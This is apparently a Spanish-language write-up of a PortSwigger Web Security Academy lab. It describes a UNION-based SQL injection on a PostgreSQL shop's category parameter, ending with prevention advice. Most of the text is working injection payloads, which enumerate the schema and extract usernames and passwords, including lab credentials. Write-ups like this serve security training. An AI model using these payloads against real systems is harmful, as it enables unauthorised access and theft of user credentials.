# 🕵️ Mystery Challenge - SQL Injection UNION-based (PostgreSQL)

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-SQL%20Injection%20%7C%20UNION-red)

## 📌 Resumen

**Mystery challenge** de **PortSwigger Web Security Academy**: un laboratorio
sin enunciado visible donde hay que **descubrir la vulnerabilidad por cuenta
propia**. En este caso, se trata de una **SQL Injection UNION-based** en el
parámetro `category` de una tienda online, con **PostgreSQL** como motor de
base de datos.

El objetivo real (descubierto en el código fuente en Base64) era
**iniciar sesión como el usuario `administrator`**.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Identificación | `'` en `category` | Error 500 → SQLi |
| Columnas | `UNION SELECT NULL,...` | 2 columnas |
| Motor | `version()` | **PostgreSQL** |
| Tablas | `information_schema.tables` | `users`, `products` |
| Columnas | `information_schema.columns` | `username`, `password` |
| Credenciales | `UNION SELECT username,password` | `administrator:rflj8gexf27s8apgwnaj` |
| Login | `/my-account` | ✅ Lab resuelto |

---

## 🔍 Análisis

### 1. Detectar la inyección

El punto de entrada es el parámetro `category` en la URL:

```
/filter?category=Accessories
```

Al añadir una comilla simple (`'`):

```
/filter?category=Accessories'
```

La aplicación devuelve **500 Internal Server Error**. ✅ **SQLi confirmada.**

### 2. Descubrir el objetivo (Mystery Challenge)

En el código fuente HTML, el botón "Reveal objective" oculta el objetivo real
en **Base64**:

```html
data-hidden-objective='TG9nIGluIGFzIHRoZSA8Y29kZT5hZG1pbmlzdHJhdG9yPC9jb2RlPiB1c2VyLg=='
```

**Decodificado:**

```
Log in as the administrator user.
```

### 3. Contar columnas

Se prueba `UNION SELECT` con distinto número de `NULL`:

| Payload | Resultado |
|---------|-----------|
| `' UNION SELECT NULL,NULL--` | ✅ 200 OK |
| `' UNION SELECT NULL,NULL,NULL--` | ❌ 500 |

✅ La consulta original devuelve **2 columnas**.

### 4. Confirmar columnas de texto

| Payload | Resultado |
|---------|-----------|
| `' UNION SELECT 'a',NULL--` | ✅ 200 OK |
| `' UNION SELECT NULL,'a'--` | ✅ 200 OK |

✅ Ambas columnas aceptan texto.

### 5. Identificar el motor

```
' UNION SELECT version(),NULL--
```

**Resultado:** `PostgreSQL 15.x on x86_64-pc-linux-gnu`

✅ El motor es **PostgreSQL**.

---

## 💥 Explotación

### 6. Enumerar tablas

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Tablas relevantes encontradas:**

- `products`
- `users` ← **objetivo**

### 7. Enumerar columnas de `users`

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Columnas encontradas:**

- `email`
- `password`
- `username`

### 8. Extraer credenciales

```sql
' UNION SELECT username,password FROM users--
```

**Resultado:**

| Usuario | Contraseña |
|---------|-----------|
| `administrator` | `rflj8gexf27s8apgwnaj` |
| `wiener` | `882igvtevovtpsmcpsgd` |

### 9. Iniciar sesión

Ir a `/my-account` y usar las credenciales del `administrator`.

✅ **Lab resuelto.**

---

## 📸 Evidencia

<img width="1156" height="186" alt="image" src="https://github.com/user-attachments/assets/24f85170-9273-4fa8-aa37-f95af7d71b52" />


---

## 🧠 Lecciones aprendidas

1. **Mystery challenges** entrenan el **pensamiento independiente**: no hay
   enunciado, hay que descubrir la vulnerabilidad y el objetivo.
2. **El error 500 con `'`** es la señal clásica de SQL Injection.
3. **`UNION SELECT NULL`** es la forma más limpia de contar columnas.
4. **`information_schema`** es la tabla estándar en PostgreSQL (y MySQL) para
   enumerar el esquema.
5. **El objetivo puede estar oculto en Base64** en el HTML. Siempre revisa el
   código fuente.
6. **Flujo completo de UNION-based SQLi**:
   1. Confirmar inyección.
   2. Contar columnas.
   3. Confirmar tipos.
   4. Enumerar tablas.
   5. Enumerar columnas.
   6. Extraer datos.

---

## 🛡️ ¿Cómo se previene?

1. **Usar consultas parametrizadas** (prepared statements):
   ```python
   cursor.execute("SELECT * FROM products WHERE category = %s", (category,))
   ```
2. **Nunca concatenar input del usuario** en consultas SQL.
3. **Validar el input** con una whitelist de categorías permitidas.
4. **Principio de mínimo privilegio** en la cuenta de base de datos.
5. **No revelar errores de la base de datos** al usuario.

---

## 🛠️ Herramientas utilizadas

- Burp Suite (Proxy, Repeater)
- Navegador web
- Decodificador Base64

---

## 📚 Referencias

- [PortSwigger - SQL Injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger - Retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
- [PostgreSQL - Information Schema](https://www.postgresql.org/docs/current/information-schema.html)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-04
